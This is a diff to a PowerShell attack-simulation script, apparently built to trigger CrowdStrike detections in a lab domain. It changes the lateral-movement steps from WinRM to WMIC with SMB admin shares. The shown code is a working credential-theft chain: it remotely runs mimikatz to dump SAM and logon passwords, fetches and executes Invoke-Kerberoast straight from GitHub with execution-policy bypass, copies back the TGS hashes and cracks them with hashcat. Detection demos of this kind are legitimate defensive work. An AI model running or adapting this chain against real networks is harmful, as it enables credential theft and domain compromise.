@@ -132,8 +132,8 @@ function Show-Menu {
     Write-Host "  3: Recon + Credential Dump (local)         [whoami, mimikatz SAM + logonpasswords]"
     Write-Host "  4: Crack Demo Hash + Kerbrute Spray        [NTLM offline crack + AD credential spray]"
     Write-Host
-    Write-Host "  --- Lateral Movement (remote via WinRM) ---" -ForegroundColor Yellow
-    Write-Host "  5: Remote Dump on DT                       [mimikatz via WinRM -> dead end, no DA]"
+    Write-Host "  --- Lateral Movement (remote via WMIC+SMB) ---" -ForegroundColor Yellow
+    Write-Host "  5: Remote Dump on DT                       [mimikatz via WMIC -> dead end, no DA]"
     Write-Host "  6: Kerberoast on DT + Crack TGS            [Invoke-Kerberoast -> IDP detection on DC]"
     Write-Host "  7: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 scripts]"
     Write-Host
@@ -386,20 +386,21 @@ public class CryptoMD4 {
         }
 
         # ================================================================
-        # STEP 5: REMOTE DUMP ON DT VIA WINRM (Active)
+        # STEP 5: REMOTE DUMP ON DT VIA WMIC+SMB (Active)
         # ================================================================
         '5' {
             Show-StepBanner -Step "5" -Title "REMOTE CREDENTIAL DUMP ON DT" -Lines @(
                 "The attacker uses the cracked demo password to remotely"
-                "execute mimikatz on DT via WinRM (Invoke-Command)."
+                "execute mimikatz on DT via WMIC (no WinRM needed)."
+                ""
+                "WMIC uses DCOM/RPC - works with just local admin access."
+                "Output is retrieved via SMB admin share (\\DT\C$)."
                 ""
                 "DT has CrowdStrike Falcon in DETECT mode - triggers detections."
-                ""
-                "Expected result: only local accounts (demo, bob, ansible-user)."
-                "No domain admin cached - dead end. Pivot to Kerberoasting next."
+                "Expected result: only local accounts - no domain admin."
             ) -Detection "CrowdStrike: LSASS access, credential dump on managed host"
 
-            # --- Build credential ---
+            # --- Load credential ---
             $demoPw = $null
             if (Test-Path "$idpDir\demo_password.txt") {
                 $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
@@ -411,63 +412,92 @@ public class CryptoMD4 {
                 break
             }
 
-            $secPw = ConvertTo-SecureString $demoPw -AsPlainText -Force
-            $cred = New-Object System.Management.Automation.PSCredential("$env:ENV_DT\demo", $secPw)
-
             Write-Host "  [+] Credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
             Write-Host "  [*] Target: $env:ENV_DT" -ForegroundColor White
             Write-Host
 
-            # --- Test WinRM connectivity ---
-            Write-Host "  [*] Testing WinRM connectivity to $env:ENV_DT..." -ForegroundColor White
-            try {
-                $testResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock { hostname } -ErrorAction Stop
-                Write-Host "  [+] WinRM OK - connected to: $testResult" -ForegroundColor Green
-            } catch {
-                Write-Host "  [!] WinRM failed: $_" -ForegroundColor Red
-                Write-Host
-                Write-Host "  WinRM may not be enabled on DT. To enable, run on DT (admin):" -ForegroundColor Yellow
-                Write-Host "    winrm quickconfig -force" -ForegroundColor Gray
-                Write-Host "  Also ensure this host trusts DT:" -ForegroundColor Yellow
-                Write-Host "    Set-Item WSMan:\localhost\Client\TrustedHosts -Value '$env:ENV_DT' -Force" -ForegroundColor Gray
+            # --- Map SMB admin share ---
+            $dtShare = "\\$env:ENV_DT\C$"
+            $dtIdpRemote = "$dtShare\IDP_Files"
+            Write-Host "  [*] Connecting to $dtShare ..." -ForegroundColor White
+            net use $dtShare /user:$env:ENV_DT\demo $demoPw /persistent:no 2>$null | Out-Null
+            if (-not (Test-Path $dtIdpRemote)) {
+                Write-Host "  [!] Cannot access $dtIdpRemote - check admin share access." -ForegroundColor Red
                 break
             }
+            Write-Host "  [+] SMB connected to $dtShare" -ForegroundColor Green
             Write-Host
 
-            # --- Remote mimikatz dump ---
-            Write-Host "  [*] Executing mimikatz remotely on $env:ENV_DT..." -ForegroundColor White
-            Write-Host
-
-            try {
-                $mimiResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock {
-                    $mimiPath = "C:\IDP_Files\Mimikatz\x64\mimikatz.exe"
-                    if (-not (Test-Path $mimiPath)) {
-                        return "[!] mimikatz.exe not found at $mimiPath on DT"
-                    }
-                    $output = & cmd.exe /c "`"$mimiPath`" `"privilege::debug`" `"token::elevate`" `"log C:\IDP_Files\dt_dump.log`" `"lsadump::sam`" `"sekurlsa::logonpasswords`" `"exit`"" 2>&1
-                    return ($output | Out-String)
-                } -ErrorAction Stop
-
-                Write-Host $mimiResult -ForegroundColor Gray
-                Write-Host
-                Write-Host "  [+] Remote dump complete." -ForegroundColor Green
-
-                # Check for interesting accounts
-                if ($mimiResult -match "clark\.monroe|svc_runbook") {
-                    Write-Host "  [!] Interesting domain account found! Check output above." -ForegroundColor Green
-                } else {
-                    Write-Host "  [-] Only local accounts found (demo, bob, ansible-user)." -ForegroundColor Yellow
-                    Write-Host "  [-] No domain admin cached. Dead end." -ForegroundColor Red
-                    Write-Host "  [*] Next: Step 6 - Kerberoast to target service accounts." -ForegroundColor Cyan
-                }
-            } catch {
-                Write-Host "  [!] Remote execution failed: $_" -ForegroundColor Red
+            # --- Check mimikatz on DT ---
+            $dtMimiExe = "$dtIdpRemote\Mimikatz\x64\mimikatz.exe"
+            if (-not (Test-Path $dtMimiExe)) {
+                Write-Host "  [!] mimikatz.exe not found on DT at C:\IDP_Files\Mimikatz\x64\" -ForegroundColor Red
+                Write-Host "  [*] Run Prep_Unmanaged.ps1 on DT first." -ForegroundColor Yellow
+                break
             }
+            Write-Host "  [+] mimikatz.exe found on DT" -ForegroundColor Green
+
+            # --- Write batch file to DT ---
+            $dtDumpLog = "C:\IDP_Files\dt_dump.log"
+            $batContent = @(
+                '@echo off'
+                'C:\IDP_Files\Mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "log C:\IDP_Files\dt_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"'
+            ) -join "`r`n"
+            $batContent | Out-File -FilePath "$dtIdpRemote\run_dump.bat" -Encoding ASCII
+            Write-Host "  [+] Batch file written to \\$env:ENV_DT\C$\IDP_Files\run_dump.bat" -ForegroundColor Green
+
+            # --- Clean previous dump ---
+            if (Test-Path "$dtIdpRemote\dt_dump.log") { Remove-Item "$dtIdpRemote\dt_dump.log" -Force }
+
+            # --- Execute via WMIC ---
+            Write-Host "  [*] Executing mimikatz on DT via WMIC..." -ForegroundColor White
+            $wmicCmd = "wmic /node:$env:ENV_DT /user:$env:ENV_DT\demo /password:$demoPw process call create `"cmd.exe /c C:\IDP_Files\run_dump.bat`""
+            cmd.exe /c $wmicCmd 2>&1 | Out-Null
+            Write-Host "  [*] WMIC process launched. Waiting for dump..." -ForegroundColor White
+
+            # --- Wait for output ---
+            $maxWait = 15
+            $waited = 0
+            while ($waited -lt $maxWait) {
+                Start-Sleep -Seconds 2
+                $waited += 2
+                if (Test-Path "$dtIdpRemote\dt_dump.log") {
+                    $logSize = (Get-Item "$dtIdpRemote\dt_dump.log").Length
+                    if ($logSize -gt 500) { break }
+                }
+                Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
+            }
+
+            # --- Retrieve and display ---
+            if (Test-Path "$dtIdpRemote\dt_dump.log") {
+                $dumpContent = Get-Content "$dtIdpRemote\dt_dump.log" -Raw
+                Write-Host
+                Write-Host "  === DT Credential Dump ===" -ForegroundColor Yellow
+                Write-Host $dumpContent -ForegroundColor Gray
+                Write-Host
+
+                # Save locally
+                $dumpContent | Out-File -FilePath "$idpDir\dt_dump_remote.log" -Encoding ASCII
+                Write-Host "  [+] Dump saved locally: $idpDir\dt_dump_remote.log" -ForegroundColor Green
+
+                if ($dumpContent -match "clark\.monroe|svc_runbook") {
+                    Write-Host "  [!] Interesting domain account found!" -ForegroundColor Green
+                } else {
+                    Write-Host "  [-] Only local accounts found - no domain admin cached." -ForegroundColor Yellow
+                    Write-Host "  [-] Dead end. Next: Step 6 - Kerberoast." -ForegroundColor Red
+                }
+            } else {
+                Write-Host "  [!] Dump log not found after ${maxWait}s. Check DT manually." -ForegroundColor Red
+            }
+
+            # Cleanup batch
+            Remove-Item "$dtIdpRemote\run_dump.bat" -Force -ErrorAction SilentlyContinue
+            net use $dtShare /delete /y 2>$null | Out-Null
             Write-Host
         }
 
         # ================================================================
-        # STEP 6: KERBEROAST ON DT + CRACK TGS (Active - Remote)
+        # STEP 6: KERBEROAST ON DT + CRACK TGS (Active - WMIC+SMB)
         # ================================================================
         '6' {
             Show-StepBanner -Step "6" -Title "KERBEROAST ON DT + CRACK TGS HASH" -Lines @(
@@ -476,13 +506,13 @@ public class CryptoMD4 {
                 ""
                 "Kerberoasting requests TGS tickets for service accounts"
                 "with SPNs in Active Directory. The ticket is encrypted"
-                "with the service account's password hash - crackable offline."
+                "with the service account password hash - crackable offline."
                 ""
-                "Any authenticated domain user can request these tickets."
+                "Executed remotely on DT via WMIC + SMB."
                 "CrowdStrike IDP detects this pattern on the DC."
             ) -Detection "CrowdStrike IDP: Kerberoasting / SuspiciousKerberosTicketRequest"
 
-            # --- Build credential ---
+            # --- Load credential ---
             $demoPw = $null
             if (Test-Path "$idpDir\demo_password.txt") {
                 $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
@@ -494,135 +524,145 @@ public class CryptoMD4 {
                 break
             }
 
-            $secPw = ConvertTo-SecureString $demoPw -AsPlainText -Force
-            $cred = New-Object System.Management.Automation.PSCredential("$env:ENV_DT\demo", $secPw)
-
             Write-Host "  [+] Credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
             Write-Host "  [*] Target: $env:ENV_DT" -ForegroundColor White
             Write-Host
 
-            # --- Test WinRM ---
-            Write-Host "  [*] Testing WinRM connectivity to $env:ENV_DT..." -ForegroundColor White
-            try {
-                $testResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock { hostname } -ErrorAction Stop
-                Write-Host "  [+] WinRM OK - connected to: $testResult" -ForegroundColor Green
-            } catch {
-                Write-Host "  [!] WinRM failed: $_" -ForegroundColor Red
-                Write-Host "  [*] Run Step 5 first to verify WinRM connectivity." -ForegroundColor Yellow
+            # --- Map SMB admin share ---
+            $dtShare = "\\$env:ENV_DT\C$"
+            $dtIdpRemote = "$dtShare\IDP_Files"
+            Write-Host "  [*] Connecting to $dtShare ..." -ForegroundColor White
+            net use $dtShare /user:$env:ENV_DT\demo $demoPw /persistent:no 2>$null | Out-Null
+            if (-not (Test-Path $dtIdpRemote)) {
+                Write-Host "  [!] Cannot access $dtIdpRemote - check admin share access." -ForegroundColor Red
                 break
             }
+            Write-Host "  [+] SMB connected" -ForegroundColor Green
             Write-Host
 
-            # ===========================================
-            # Step 6a: Kerberoast remotely on DT
-            # ===========================================
-            Write-Host "  ===========================================" -ForegroundColor DarkGray
-            Write-Host "  Step 6a: Kerberoasting from DT (remote)" -ForegroundColor Yellow
-            Write-Host "  ===========================================" -ForegroundColor DarkGray
-            Write-Host
-            Write-Host "  [*] Downloading Invoke-Kerberoast on DT and executing..." -ForegroundColor White
+            # --- Write Kerberoast PS1 to DT ---
+            $kerbScript = @'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$outFile = "C:\IDP_Files\kerberoast_output.txt"
+$hashFile = "C:\IDP_Files\kerberoast_hashes.txt"
+try {
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+    $results = Invoke-Kerberoast -OutputFormat Hashcat
+    if ($results) {
+        $results | Format-List | Out-File -FilePath $outFile -Encoding ASCII
+        $results | Select-Object -ExpandProperty Hash | Out-File -FilePath $hashFile -Encoding ASCII
+        Add-Content -Path $outFile -Value "`n[SUCCESS] Found $(@($results).Count) service account(s)"
+    } else {
+        "[NO_RESULTS] No SPN accounts found" | Out-File -FilePath $outFile -Encoding ASCII
+    }
+} catch {
+    "[ERROR] $_" | Out-File -FilePath $outFile -Encoding ASCII
+}
+'@
+            $kerbScript | Out-File -FilePath "$dtIdpRemote\run_kerberoast.ps1" -Encoding ASCII
+            Write-Host "  [+] Kerberoast script written to DT" -ForegroundColor Green
+
+            # Clean previous output
+            @("$dtIdpRemote\kerberoast_output.txt", "$dtIdpRemote\kerberoast_hashes.txt") | ForEach-Object {
+                if (Test-Path $_) { Remove-Item $_ -Force }
+            }
+
+            # --- Execute via WMIC ---
+            Write-Host "  [*] Executing Kerberoast on DT via WMIC..." -ForegroundColor White
             Write-Host "  [*] This triggers IDP detection on the DC." -ForegroundColor Yellow
-            Write-Host
+            $wmicCmd = "wmic /node:$env:ENV_DT /user:$env:ENV_DT\demo /password:$demoPw process call create `"powershell.exe -ep bypass -file C:\IDP_Files\run_kerberoast.ps1`""
+            cmd.exe /c $wmicCmd 2>&1 | Out-Null
+            Write-Host "  [*] WMIC process launched. Waiting for results..." -ForegroundColor White
 
-            try {
-                $kerbResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock {
-                    try {
-                        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
-                        $results = Invoke-Kerberoast -OutputFormat Hashcat -ErrorAction Stop
-                        if ($results) {
-                            $hashes = $results | Select-Object -ExpandProperty Hash
-                            $hashes | Out-File -FilePath "C:\IDP_Files\kerberoast_hashes.txt" -Encoding ASCII
-                            return @{
-                                Success = $true
-                                Count   = @($results).Count
-                                Hashes  = ($hashes | Out-String)
-                                Users   = ($results | Select-Object -ExpandProperty SamAccountName | Out-String)
+            # --- Wait for output ---
+            $maxWait = 30
+            $waited = 0
+            while ($waited -lt $maxWait) {
+                Start-Sleep -Seconds 3
+                $waited += 3
+                if (Test-Path "$dtIdpRemote\kerberoast_output.txt") {
+                    $outSize = (Get-Item "$dtIdpRemote\kerberoast_output.txt").Length
+                    if ($outSize -gt 50) { break }
+                }
+                Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
+            }
+
+            # --- Retrieve results ---
+            if (Test-Path "$dtIdpRemote\kerberoast_output.txt") {
+                $kerbOutput = Get-Content "$dtIdpRemote\kerberoast_output.txt" -Raw
+                Write-Host
+                Write-Host "  === Kerberoast Results ===" -ForegroundColor Yellow
+                Write-Host $kerbOutput -ForegroundColor Gray
+                Write-Host
+
+                if ($kerbOutput -match "\[SUCCESS\]") {
+                    Write-Host "  [+] Kerberoast SUCCESS!" -ForegroundColor Green
+
+                    # Copy hashes locally
+                    if (Test-Path "$dtIdpRemote\kerberoast_hashes.txt") {
+                        Copy-Item "$dtIdpRemote\kerberoast_hashes.txt" "$idpDir\kerberoast_hashes.txt" -Force
+                        Write-Host "  [+] TGS hashes copied to $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
+                        Write-Host
+
+                        # --- Crack TGS hash ---
+                        Write-Host "  ===========================================" -ForegroundColor DarkGray
+                        Write-Host "  Cracking TGS hash" -ForegroundColor Yellow
+                        Write-Host "  ===========================================" -ForegroundColor DarkGray
+                        Write-Host
+
+                        # Check if hashcat is available
+                        $hashcatPath = $null
+                        @("$idpDir\hashcat.exe", "hashcat.exe", "hashcat") | ForEach-Object {
+                            if (-not $hashcatPath -and (Get-Command $_ -ErrorAction SilentlyContinue)) { $hashcatPath = $_ }
+                        }
+                        if (-not $hashcatPath -and (Test-Path "$idpDir\hashcat.exe")) { $hashcatPath = "$idpDir\hashcat.exe" }
+
+                        if ($hashcatPath) {
+                            Write-Host "  [+] hashcat found: $hashcatPath" -ForegroundColor Green
+                            Write-Host "  [*] Cracking TGS with wordlist..." -ForegroundColor White
+                            try {
+                                $hashcatProc = Start-Process -FilePath $hashcatPath `
+                                    -ArgumentList "-m 13100 `"$idpDir\kerberoast_hashes.txt`" `"$wordlistFile`" --force --potfile-disable -o `"$idpDir\kerberoast_cracked.txt`"" `
+                                    -NoNewWindow -Wait -PassThru
+                                if (Test-Path "$idpDir\kerberoast_cracked.txt") {
+                                    $cracked = Get-Content "$idpDir\kerberoast_cracked.txt"
+                                    Write-Host "  [+] CRACKED!" -ForegroundColor Green
+                                    $cracked | ForEach-Object { Write-Host "  $_" -ForegroundColor Green }
+                                } else {
+                                    Write-Host "  [-] hashcat finished but no cracks (exit: $($hashcatProc.ExitCode))." -ForegroundColor Yellow
+                                }
+                            } catch {
+                                Write-Host "  [!] hashcat error: $_" -ForegroundColor Red
                             }
                         } else {
-                            return @{ Success = $false; Error = "No SPN accounts found. Register SPNs on the DC first." }
-                        }
-                    } catch {
-                        return @{ Success = $false; Error = $_.ToString() }
-                    }
-                } -ErrorAction Stop
-
-                if ($kerbResult.Success) {
-                    Write-Host "  [+] Kerberoast SUCCESS! Found $($kerbResult.Count) service account(s):" -ForegroundColor Green
-                    Write-Host "      $($kerbResult.Users.Trim())" -ForegroundColor White
-                    Write-Host
-
-                    # Save hashes locally
-                    $kerbResult.Hashes.Trim() | Out-File -FilePath "$idpDir\kerberoast_hashes.txt" -Encoding ASCII
-                    Write-Host "  [+] TGS hashes saved to $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
-                    Write-Host
-                    Write-Host "  --- TGS Hash (truncated) ---" -ForegroundColor DarkGray
-                    $kerbResult.Hashes.Trim().Split("`n") | ForEach-Object {
-                        if ($_.Length -gt 120) { Write-Host "  $($_.Substring(0,120))..." -ForegroundColor Gray }
-                        else { Write-Host "  $_" -ForegroundColor Gray }
-                    }
-                    Write-Host
-                    pause
-
-                    # ===========================================
-                    # Step 6b: Crack TGS hash
-                    # ===========================================
-                    Write-Host
-                    Write-Host "  ===========================================" -ForegroundColor DarkGray
-                    Write-Host "  Step 6b: Cracking TGS hash" -ForegroundColor Yellow
-                    Write-Host "  ===========================================" -ForegroundColor DarkGray
-                    Write-Host
-                    Write-Host "  TGS tickets use RC4-HMAC (NTLM) encryption." -ForegroundColor White
-                    Write-Host "  Cracking: try each password -> compute NTLM -> decrypt ticket." -ForegroundColor White
-                    Write-Host
-
-                    # Check if hashcat is available
-                    $hashcatPath = $null
-                    @("$idpDir\hashcat.exe", "hashcat.exe", "hashcat") | ForEach-Object {
-                        if (-not $hashcatPath -and (Get-Command $_ -ErrorAction SilentlyContinue)) { $hashcatPath = $_ }
-                    }
-                    if (-not $hashcatPath -and (Test-Path "$idpDir\hashcat.exe")) { $hashcatPath = "$idpDir\hashcat.exe" }
-
-                    if ($hashcatPath) {
-                        Write-Host "  [+] hashcat found: $hashcatPath" -ForegroundColor Green
-                        Write-Host "  [*] Cracking TGS with wordlist..." -ForegroundColor White
-                        Write-Host
-                        try {
-                            $hashcatProc = Start-Process -FilePath $hashcatPath `
-                                -ArgumentList "-m 13100 `"$idpDir\kerberoast_hashes.txt`" `"$wordlistFile`" --force --potfile-disable -o `"$idpDir\kerberoast_cracked.txt`"" `
-                                -NoNewWindow -Wait -PassThru
-                            if (Test-Path "$idpDir\kerberoast_cracked.txt") {
-                                $cracked = Get-Content "$idpDir\kerberoast_cracked.txt"
-                                Write-Host "  [+] CRACKED!" -ForegroundColor Green
-                                $cracked | ForEach-Object { Write-Host "  $_" -ForegroundColor Green }
-                            } else {
-                                Write-Host "  [-] hashcat finished but no cracks (exit: $($hashcatProc.ExitCode))." -ForegroundColor Yellow
+                            Write-Host "  [-] hashcat not found locally." -ForegroundColor Yellow
+                            Write-Host "  [*] To crack offline:" -ForegroundColor White
+                            Write-Host "    hashcat -m 13100 $idpDir\kerberoast_hashes.txt $wordlistFile" -ForegroundColor Green
+                            Write-Host
+                            Write-Host "  [*] Or enter the service account password if known:" -ForegroundColor White
+                            $manualPw = Read-Host "  Service account password (or Enter to skip)"
+                            if ($manualPw) {
+                                Write-Host "  [+] Password: $manualPw" -ForegroundColor Green
+                                Write-Host "  [*] In a real attack this grants access to everything the service account can reach." -ForegroundColor White
                             }
-                        } catch {
-                            Write-Host "  [!] hashcat error: $_" -ForegroundColor Red
-                        }
-                    } else {
-                        Write-Host "  [-] hashcat not found locally." -ForegroundColor Yellow
-                        Write-Host "  [*] To crack, install hashcat or use another machine:" -ForegroundColor White
-                        Write-Host "    hashcat -m 13100 $idpDir\kerberoast_hashes.txt $wordlistFile" -ForegroundColor Green
-                        Write-Host
-                        Write-Host "  [*] Or if you know the service account password, enter it to verify:" -ForegroundColor White
-                        $manualPw = Read-Host "  Service account password (or Enter to skip)"
-                        if ($manualPw) {
-                            Write-Host "  [+] Password noted: $manualPw" -ForegroundColor Green
-                            Write-Host "  [*] In a real attack, this grants access to whatever the service account can reach." -ForegroundColor White
                         }
                     }
-                } else {
-                    Write-Host "  [!] Kerberoast returned no results: $($kerbResult.Error)" -ForegroundColor Red
+                } elseif ($kerbOutput -match "\[NO_RESULTS\]") {
+                    Write-Host "  [!] No SPN accounts found in the domain." -ForegroundColor Red
                     Write-Host
                     Write-Host "  Pre-requisite: register an SPN for a service account on the DC:" -ForegroundColor Yellow
                     Write-Host "    setspn -A MSSQLSvc/warp-duck-DT.$($env:ENV_DOMAIN):1433 svc_runbook" -ForegroundColor Gray
-                    Write-Host "    (ensure svc_runbook has a crackable password from the wordlist)" -ForegroundColor Gray
+                } else {
+                    Write-Host "  [!] Kerberoast may have failed. Check output above." -ForegroundColor Red
                 }
-            } catch {
-                Write-Host "  [!] Remote Kerberoast execution failed: $_" -ForegroundColor Red
+            } else {
+                Write-Host "  [!] No output after ${maxWait}s. PowerShell may have been blocked on DT." -ForegroundColor Red
+                Write-Host "  [*] Check if Defender blocked the script on DT." -ForegroundColor Yellow
             }
+
+            # Cleanup
+            Remove-Item "$dtIdpRemote\run_kerberoast.ps1" -Force -ErrorAction SilentlyContinue
+            net use $dtShare /delete /y 2>$null | Out-Null
             Write-Host
         }
 
